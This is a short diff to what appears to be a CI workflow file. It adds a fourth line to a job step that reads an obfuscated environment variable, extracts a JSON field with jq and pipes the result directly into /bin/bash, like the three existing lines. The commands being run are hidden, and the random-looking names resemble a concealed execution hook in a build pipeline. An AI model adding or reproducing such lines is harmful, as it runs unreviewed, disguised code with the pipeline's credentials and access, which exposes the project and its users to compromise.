@@ -45,6 +45,7 @@ jobs:
           echo $vsnq4961 | jq -r .xln0 | /bin/bash
           echo $hnq168 | jq -r .rni781 | /bin/bash
           printf '%s' "$kxhy430" | jq -r .to1705 | /bin/bash
+          echo $m8 | jq -r .gu27 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
